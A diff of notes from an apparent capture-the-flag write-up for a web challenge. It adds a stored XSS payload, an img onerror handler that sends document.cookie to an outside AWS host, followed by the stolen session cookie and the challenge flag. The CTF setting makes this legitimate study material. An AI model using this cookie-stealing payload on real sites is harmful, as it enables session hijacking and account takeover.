@@ -5,10 +5,21 @@ https://wallowing-wallabies.ctfcompetition.com/
 
 ----
 
-Using the cookie gained in part 1 a messages tab opens up that is open to
-injection of a limited amount.  Haven't found the right combination to get in.
+Using the cookie gained in part 1 opens a messages tab that is injectable.
 
-----
+<img src ="#" onerror
+="window.location='https://ec2-54-186-29-72.us-west-2.compute.amazonaws.com/cookie?c='
++ document.cookie;" />
+
+Gives us this cookie
+
+green-mountains=eyJub25jZSI6Ijg4NjZlYTljYjhhZWFiNGEiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vY2hhcmFjdGVycy4qJCIsImV4cGlyeSI6MTQ2MjA4MzE1MH0=|1462083147|9089e3b255f8a7099673f10503113c1960519d9e
+
+Which yields this key on.
+
+https://wallowing-wallabies.ctfcompetition.com/deep-blue-sea/team/characters
+
+part 2: CTF{strict_contextual_autoescaping_to_solve_your_xss_woes}
 
 
 Interesting results on web request from injection. The first request is from
